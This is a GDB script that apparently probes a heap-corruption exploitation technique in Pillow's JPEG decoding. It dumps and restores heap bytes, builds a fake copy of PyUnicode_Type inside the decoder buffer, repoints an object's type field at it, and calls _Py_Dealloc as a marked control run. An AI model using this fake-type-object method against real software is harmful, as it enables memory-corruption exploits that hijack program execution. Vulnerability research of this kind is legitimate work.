set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
dump binary memory /tmp/pw2-w4/heap_orig.bin $b+128 $b+1024
printf "SAVED type=%lx\n",*(unsigned long*)($b+184)
finish
printf "AFTER_DECODE type=%lx\n",*(unsigned long*)($b+184)
restore /tmp/pw2-w4/heap_orig.bin binary $b+128
dump binary memory /tmp/pw2-w4/realtype.bin (char*)&PyUnicode_Type (char*)&PyUnicode_Type+416
restore /tmp/pw2-w4/realtype.bin binary $b+512
# CONTROL: leave tp_dealloc at the real PyUnicode_Type value
set *(unsigned long*)($b+184)=$b+512
printf "CONTROL faketype=%lx tp_dealloc=%lx objtype=%lx\n",$b+512,*(unsigned long*)($b+512+48),*(unsigned long*)($b+184)
break *0x45e6e6
printf "CALLING _Py_Dealloc (control)\n"
call (void)_Py_Dealloc((void*)($b+176))
printf "AFTER_CALL pc=%p\n",$pc
